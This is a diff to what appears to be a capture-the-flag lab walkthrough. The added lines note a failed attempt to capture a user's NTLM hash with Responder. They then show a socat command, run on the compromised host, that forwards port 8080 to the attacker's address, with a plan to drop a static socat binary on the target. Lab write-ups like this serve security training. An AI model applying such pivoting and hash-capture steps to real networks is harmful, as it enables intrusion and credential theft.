@@ -796,7 +796,13 @@ When trying an IP address it fails, saying `Invalid Input` likely meaning you ca
 
 Its also not possible to add a DNS record in this situation for my own machine using `victor.r` credentials
 
-So i cannot capture 
+So i cannot capture the NTLM hash of the user using responder
+
+```python
+ebelford@drip:/tmp$ ./socat TCP-LISTEN:8080,bind=0.0.0.0,fork TCP:10.10.14.61:80
+```
+
+Ill get a statically compiled socat binary on the SSH target,
 
 
 
